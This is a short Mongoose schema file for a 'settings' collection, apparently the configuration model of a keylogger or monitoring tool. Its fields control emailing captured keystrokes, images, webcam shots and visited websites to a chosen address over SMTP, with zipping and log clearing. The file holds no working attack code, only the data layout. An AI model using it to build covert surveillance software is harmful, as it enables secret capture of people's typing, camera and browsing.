const mongoose = require('mongoose');
var schema = new mongoose.Schema({
    name: String,
    user : String,
    hoursEmail: Number,
    minutesEmail: Number,
    limitEmail: Number,
    passwordZipEmail: String,
    smtpEmail: String,
    userEmail: String,
    passwordEmail: String,
    subjectEmail: String,
    portEmail: Number,
    enableEmail: Boolean,
    enableUploadKeystroke: Boolean,
    enableUploadImage: Boolean,
    enableUploadWebcam: Boolean,
    enableUploadWebsite: Boolean,
    enableLimit: Boolean,
    enableClear: Boolean,
    enableZip: Boolean,
    sendTo: String
},
    { collection: "settings" });
module.exports = mongoose.model('modelEmail', schema);